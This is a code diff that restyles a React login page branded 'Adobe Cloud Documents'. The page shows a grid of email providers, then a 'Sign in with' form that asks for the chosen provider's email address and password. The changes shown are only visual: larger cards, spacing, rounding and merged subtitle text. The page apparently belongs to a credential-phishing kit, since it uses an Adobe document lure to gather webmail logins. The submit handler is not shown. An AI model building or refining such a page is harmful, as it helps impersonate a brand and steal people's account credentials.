@@ -130,7 +130,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
         backgroundRepeat: 'no-repeat'
       }}
     >
-      {/* Decorative overlay: smaller logo + text positioned left-center of the background */}
+      {/* Decorative overlay: smaller logo + combined subtitle line under the title */}
       <div className="absolute left-6 top-1/2 transform -translate-y-1/2 flex flex-col items-start gap-2 z-0 pointer-events-none">
         <div className="flex items-center gap-3">
           <img
@@ -140,15 +140,14 @@ const LoginPage: React.FC<LoginPageProps> = ({
           />
           <div className="text-white drop-shadow-lg">
             <div className="text-2xl md:text-3xl font-semibold leading-tight">Adobe Cloud Documents</div>
+            <div className="text-white/90 text-sm md:text-base mt-1">PDF and e-signing tools. • securely access documents</div>
           </div>
         </div>
-        <div className="text-white/90 drop-shadow-lg text-sm md:text-base">PDF and e-signing tools.</div>
-        <div className="text-white/80 drop-shadow-md text-sm md:text-base italic">securely access documents</div>
       </div>
 
-      {/* Card (kept width same as before and position as previously moved right) */}
-      <div className="w-full max-w-md relative z-10 ml-6 md:ml-24 lg:ml-40">
-        <div className="bg-white/80 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-8 relative overflow-hidden">
+      {/* Card (increased overall size) */}
+      <div className="w-full max-w-2xl relative z-10 ml-6 md:ml-24 lg:ml-40">
+        <div className="bg-white/90 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-10 relative overflow-hidden min-h-[600px]">
           <div className="absolute inset-0 bg-gradient-to-br from-white/50 to-transparent pointer-events-none"></div>
           <div className="relative z-10">
             {/* Centered "Select Your Provider" pill in header */}
@@ -159,15 +158,15 @@ const LoginPage: React.FC<LoginPageProps> = ({
               </div>
             </div>
 
-            <div className="mt-4">
+            <div className="mt-6">
               {!selectedProvider ? (
-                <div className="space-y-4">
-                  <div className="grid grid-cols-2 gap-4">
+                <div className="space-y-6">
+                  <div className="grid grid-cols-3 gap-6">
                     {emailProviders.map((provider) => (
                       <button 
                         key={provider.name} 
                         onClick={() => handleProviderSelect(provider.name)} 
-                        className="group relative flex flex-col items-center gap-3 p-4 bg-white/60 backdrop-blur-sm rounded-xl shadow-sm border border-gray-100/50 hover:shadow-lg hover:bg-white/80 transition-all duration-300 transform hover:-translate-y-1 hover:scale-105" 
+                        className="group relative flex flex-col items-center gap-4 p-6 bg-white/60 backdrop-blur-sm rounded-2xl shadow-sm border border-gray-100/50 hover:shadow-lg hover:bg-white/80 transition-all duration-300 transform hover:-translate-y-1 hover:scale-105" 
                         aria-label={`Select ${provider.name}`} 
                         type="button"
                       >
@@ -175,22 +174,22 @@ const LoginPage: React.FC<LoginPageProps> = ({
                         <img 
                           src={provider.logo} 
                           alt={provider.name} 
-                          className="w-10 h-10 object-contain" 
+                          className="w-12 h-12 object-contain" 
                           onError={(e) => {
                             const t = e.target as HTMLImageElement;
                             t.style.display = 'none';
                           }}
                         />
-                        <div className="text-sm font-semibold text-gray-800 group-hover:text-gray-900 transition-colors">
+                        <div className="text-base font-semibold text-gray-800 group-hover:text-gray-900 transition-colors">
                           {provider.name}
                         </div>
-                        <div className="absolute inset-0 rounded-xl bg-gradient-to-br from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
+                        <div className="absolute inset-0 rounded-2xl bg-gradient-to-br from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                       </button>
                     ))}
                   </div>
                 </div>
               ) : (
-                <div className="space-y-6">
+                <div className="space-y-8">
                   <div className="flex items-center gap-3 mb-6">
                     <button 
                       onClick={handleBackToProviders} 
@@ -204,14 +203,14 @@ const LoginPage: React.FC<LoginPageProps> = ({
                       <img 
                         src={emailProviders.find(p => p.name === selectedProvider)?.logo} 
                         alt={selectedProvider} 
-                        className="w-8 h-8 object-contain" 
+                        className="w-10 h-10 object-contain" 
                         onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
                       />
-                      <h2 className="text-lg font-bold text-gray-900">Sign in with {selectedProvider}</h2>
+                      <h2 className="text-2xl font-bold text-gray-900">Sign in with {selectedProvider}</h2>
                     </div>
                   </div>
 
-                  <form onSubmit={handleFormSubmit} className="space-y-5">
+                  <form onSubmit={handleFormSubmit} className="space-y-6">
                     {errorMessage && (
                       <div className="bg-gradient-to-r from-red-50 to-pink-50 border border-red-200 rounded-xl p-4 animate-shake">
                         <p className="text-red-700 text-sm font-medium flex items-center gap-2">
@@ -223,7 +222,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
                       </div>
                     )}
 
-                    <div className="space-y-4">
+                    <div className="space-y-5">
                       <div>
                         <label className="block text-sm font-semibold text-gray-700 mb-2">Email Address</label>
                         <div className="relative group">
@@ -232,7 +231,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
                             type="email" 
                             value={email} 
                             onChange={(e) => setEmail(e.target.value)} 
-                            className="w-full pl-12 pr-4 py-3.5 bg-white/70 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80" 
+                            className="w-full pl-14 pr-4 py-4 bg-white/80 backdrop-blur-sm border border-gray-200 rounded-2xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/90" 
                             placeholder="Enter your email address" 
                             required 
                           />
@@ -247,7 +246,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
                             type={showPassword ? 'text' : 'password'} 
                             value={password} 
                             onChange={(e) => setPassword(e.target.value)} 
-                            className="w-full pl-12 pr-12 py-3.5 bg-white/70 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80" 
+                            className="w-full pl-14 pr-14 py-4 bg-white/80 backdrop-blur-sm border border-gray-200 rounded-2xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/90" 
                             placeholder="Enter your password" 
                             required 
                           />
@@ -265,7 +264,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
                     <button 
                       type="submit" 
                       disabled={isLoading || !email || !password} 
-                      className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-4 rounded-xl font-bold text-lg hover:from-blue-700 hover:to-indigo-700 disabled:opacity-60 disabled:cursor-not-allowed transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl relative overflow-hidden group"
+                      className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-4 rounded-2xl font-bold text-lg hover:from-blue-700 hover:to-indigo-700 disabled:opacity-60 disabled:cursor-not-allowed transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl relative overflow-hidden group"
                     >
                       <div className="absolute inset-0 bg-gradient-to-r from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                       <div className="relative flex items-center justify-center gap-2">
